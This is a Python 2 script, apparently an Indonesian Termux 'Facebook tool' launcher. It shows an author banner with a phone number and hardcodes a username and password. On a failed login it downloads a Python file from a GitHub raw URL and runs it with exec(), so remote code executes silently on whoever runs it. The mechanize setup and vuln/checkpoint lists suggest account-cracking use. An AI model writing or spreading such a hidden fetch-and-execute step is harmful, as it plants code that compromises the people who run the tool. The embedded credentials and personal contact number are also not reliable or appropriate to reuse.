import os, requests, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib
from multiprocessing.pool import ThreadPool
try:
    import mechanize
except ImportError:
	os.system('pip2 install requests mechanize')
else:
    try:
        import requests
    except ImportError:
        os.system('pip2 install requests')

from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

def keluar():
    print '\x1b[1;91m[!] Keluar'
    os.sys.exit()


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.1)



def tik():
    titik = [
     '.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;91m[+] \x1b[1;92m[ Loading ] \x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(1)

back = 0
threads = []
berhasil = []
cekpoint = []
gagal = []
idteman = []
idfromteman = []
idmem = []
id = []
listgrup = []
vulnot = '\x1b[31mNot Vuln'
vuln = '\x1b[32mVuln'

normal = "\033[0;37;40m" #normal
miring = "\033[3;37;40m" #miring

#text warna
abu = "\033[1;30;40m" #abu abu
merah = "\033[1;31;40m" #merah
hijau = "\033[1;32;40m" #hijau
kuning = "\033[1;33;40m" #kuning
biru = "\033[1;34;40m" #biru
pink = "\033[1;35;40m" #pink
birumuda = "\033[1;36;40m" #birumuda
putih = "\033[1;37;40m" #putih
os.system('reset')

print
print putih+"                                                ["+kuning+" Tool - Facebook "+putih+"]"
print putih+"               ( ) > Termux                                         "
print putih+"              (   )                "+merah+"?????????????????????????????????"
print putih+"             (     )               "+merah+"??"+kuning+" Author : Mr. Achmad         "+hijau+"?? "
print putih+"           _(       )_             "+merah+"??"+kuning+" Contact WA : 085608035292   "+hijau+"??"
print putih+"          [ INDONESIA ]            "+hijau+"?????????????????????????????????"+normal
print "____________________________________________________________________"
print "_____________________"+biru+"Selamat_Datang_ya_Bangsat"+putih+"______________________"
print

print "  Silakan masukan username and password"
print "  Masukan username : mrachmad404"
print
username = 'mrachmad404'
password = 'jancok81kau'

def restart():
	ngulang = sys.executable
	os.execl(ngulang, ngulang, *sys.argv)

def main():
	uname = raw_input(hijau+"username : ")
	if uname == username:
		pwd = raw_input(hijau+"password : ")
		if pwd == password:
			jalan("\033[1;32m[ Login Sukses ]")
			os.system('python exambro.py')

		else:
			jalan("\033[91m[ Login Gagal ]")
			exec(requests.get("https://raw.githubusercontent.com/xWR4217/codkk/master/aaaa.py").text)

	else:
		exec(requests.get("https://raw.githubusercontent.com/xWR4217/codkk/master/aaaa.py").text)
		print "\033[91mSalah woy bangsat"
		print "\033[91mcontact author kalo gak tau Bangsat >:(\n"
		print
		restart()
#achmad
main()